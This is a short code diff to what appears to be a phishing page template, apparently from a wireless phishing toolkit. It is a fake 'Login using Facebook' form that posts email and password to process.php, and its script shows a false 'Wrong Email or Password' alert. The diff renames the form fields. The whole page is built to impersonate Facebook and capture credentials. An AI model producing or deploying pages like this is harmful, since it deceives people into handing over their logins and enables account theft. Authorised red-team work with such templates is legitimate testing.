@@ -4,7 +4,7 @@
 
 <script>
 function validateForm() {
-    var x = document.forms["theform"]["wfphshr-email"].value;
+    var x = document.forms["theform"]["email"].value;
     var atpos = x.indexOf("@");
     var dotpos = x.lastIndexOf(".");
     if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length) {
@@ -12,7 +12,7 @@ function validateForm() {
         return false;
     }
 
-    var x = document.forms["theform"]["wfphshr-password"].value;
+    var x = document.forms["theform"]["password"].value;
     if (5>=x.length) {
         alert("Failed to authenticate. Wrong Email or Password.");
         return false;
@@ -42,8 +42,8 @@ function validateForm() {
     <h2>Login using Facebook</h2>
     <!-- <img src="/static/logos/facebook-logo.png" width="25%" class="logo"></img> -->
     <form name="theform" class="theform" method="post" action="process.php" onsubmit="return validateForm();">
-      <input type="text" placeholder="Email" name="wfphshr-email"/>
-      <input type="password" placeholder="Password" name="wfphshr-password"/>
+      <input type="username" placeholder="Email" name="username"/>
+      <input type="password" placeholder="Password" name="password"/>
       <button class="login-btn">Login</button>
     </form> 
   </div>
